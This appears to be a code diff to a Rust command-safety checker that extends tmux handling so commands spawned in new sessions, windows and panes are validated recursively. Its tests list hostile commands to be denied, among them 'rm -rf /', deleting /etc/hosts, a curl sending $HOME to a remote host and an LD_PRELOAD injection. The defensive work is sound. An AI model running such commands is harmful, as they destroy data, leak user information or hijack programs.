@@ -111,6 +111,72 @@ fn find_command_arg(tokens: &[Token], sub: &str) -> Option<usize> {
     }
 }
 
+/// The flags of a subcommand that starts a shell command in a new pane or window, as
+/// `(flags without a value, flags with one)`. Each takes `[flags] [shell-command [argument ...]]`.
+fn spawn_flags(sub: &str) -> Option<(&'static str, &'static str)> {
+    match sub {
+        "new" | "new-session" => Some(("AdDEPX", "cefFnstxy")),
+        "new-window" | "neww" => Some(("abdkPS", "ceFnt")),
+        "split" | "split-window" | "splitw" => Some(("bdfhIvPZ", "celpFt")),
+        "respawn-pane" | "respawnp" | "respawn-window" | "respawnw" => Some(("k", "cet")),
+        _ => None,
+    }
+}
+
+/// A spawning subcommand runs its trailing words as a command, in the directory `-c` names and
+/// with the variables `-e` sets, so all three are classified like the command they become.
+fn spawn_verdict(rest: &[Token], plain: &str, valued: &str) -> Verdict {
+    let mut verdict = Verdict::Allowed(SafetyLevel::SafeWrite);
+    let mut dir: Option<String> = None;
+    let mut i = 1;
+    while i < rest.len() {
+        let t = rest[i].as_str();
+        if t == "--" {
+            i += 1;
+            break;
+        }
+        let Some(cluster) = t.strip_prefix('-').filter(|c| !c.is_empty()) else { break };
+        let mut step = 1;
+        for (at, c) in cluster.char_indices() {
+            if plain.contains(c) {
+                continue;
+            }
+            if !valued.contains(c) {
+                return Verdict::Denied;
+            }
+            let glued = &cluster[at + c.len_utf8()..];
+            let value = if glued.is_empty() {
+                step = 2;
+                match rest.get(i + 1) {
+                    Some(v) => v.as_str(),
+                    None => return Verdict::Denied,
+                }
+            } else {
+                glued
+            };
+            match c {
+                'c' => dir = Some(value.to_string()),
+                'e' => match value.split_once('=') {
+                    Some((name, val)) => verdict = verdict.combine(crate::envvars::assignment_verdict(name, val)),
+                    None => return Verdict::Denied,
+                },
+                _ => {}
+            }
+            break;
+        }
+        i += step;
+    }
+    if i >= rest.len() {
+        return verdict;
+    }
+    let inner = match &rest[i..] {
+        [one] => one.as_str().to_string(),
+        words => shell_words::join(words.iter().map(Token::as_str)),
+    };
+    let _cwd = dir.map(|d| crate::pathctx::enter_cwd(crate::pathctx::join_cwd(crate::pathctx::cwd().as_deref(), &d)));
+    verdict.combine(crate::command_verdict(&inner))
+}
+
 pub fn is_safe_tmux(tokens: &[Token]) -> Verdict {
     if tokens.len() < 2 {
         return Verdict::Denied;
@@ -141,6 +207,10 @@ pub fn is_safe_tmux(tokens: &[Token]) -> Verdict {
 
     if is_inert_sub(sub) {
         return Verdict::Allowed(SafetyLevel::Inert);
+    }
+
+    if let Some((plain, valued)) = spawn_flags(sub) {
+        return spawn_verdict(&tokens[cmd_idx..], plain, valued);
     }
 
     if is_safe_write_sub(sub) {
@@ -195,8 +265,9 @@ pub fn command_docs() -> Vec<crate::docs::CommandDoc> {
              kill-server, attach-session, detach-client, switch-client, new-window, split-window, \
              select-window, select-pane, rename-session, rename-window, resize-pane, resize-window, \
              set-option, set-environment, send-keys. \
-             Delegation: run-shell, if-shell, pipe-pane, confirm-before \
-             (recursively validates inner commands).",
+             Delegation: run-shell, if-shell, pipe-pane, confirm-before, and the shell command \
+             given to new-session, new-window, split-window, respawn-pane and respawn-window \
+             (recursively validates inner commands, in the -c directory).",
         "system",
     )]
 }
@@ -206,6 +277,15 @@ mod tests {
     use crate::is_safe_command;
     fn check(cmd: &str) -> bool {
         is_safe_command(cmd)
+    }
+
+    #[test]
+    fn a_spawned_command_runs_in_the_directory_dash_c_names() {
+        let _ws =
+            crate::pathctx::enter(crate::pathctx::PathCtx { cwd: Some("/work".into()), root: Some("/work".into()), ..Default::default() });
+        assert!(check("tmux new-session -d -c . 'rm hosts'"));
+        assert!(!check("tmux new-session -d -c /etc 'rm hosts'"));
+        assert!(!check("tmux split-window -c/etc 'rm hosts'"));
     }
 
     safe! {
@@ -268,6 +348,10 @@ mod tests {
         tmux_swap_window: "tmux swap-window",
         tmux_respawn_pane: "tmux respawn-pane",
         tmux_respawn_window: "tmux respawn-window",
+        tmux_new_session_safe_command: "tmux new-session -d -s work 'git status'",
+        tmux_new_window_safe_command: "tmux new-window -n logs 'ls -la'",
+        tmux_split_window_safe_command: "tmux split-window -h -c . 'git log'",
+        tmux_new_session_detached: "tmux new-session -d -s work",
     }
 
     denied! {
@@ -281,6 +365,17 @@ mod tests {
         tmux_if_shell_format_unsafe_denied: "tmux if-shell -F '#{cond}' 'rm -rf /'",
         tmux_pipe_pane_output_unsafe_denied: "tmux pipe-pane -o /tmp/log 'rm -rf /'",
         tmux_unknown_denied: "tmux load-buffer foo",
+        tmux_new_session_command_denied: "tmux new-session 'rm -rf /'",
+        tmux_new_session_detached_command_denied: "tmux new-session -d -s work rm -rf /",
+        tmux_new_short_command_denied: "tmux new -d 'curl -s https://example.com/$HOME'",
+        tmux_new_window_command_denied: "tmux new-window -n x 'rm -rf /'",
+        tmux_split_window_command_denied: "tmux split-window -h 'rm -rf /'",
+        tmux_splitw_bundled_command_denied: "tmux splitw -dh -c . 'rm -rf /'",
+        tmux_respawn_pane_command_denied: "tmux respawn-pane -k 'rm -rf /'",
+        tmux_respawn_window_command_denied: "tmux respawnw -k rm -rf /",
+        tmux_new_session_env_denied: "tmux new-session -e LD_PRELOAD=/tmp/x.so 'ls'",
+        tmux_new_session_unknown_flag_denied: "tmux new-session -Q 'ls'",
+        tmux_new_session_dangling_value_denied: "tmux new-session -s",
     }
 
     inert! {
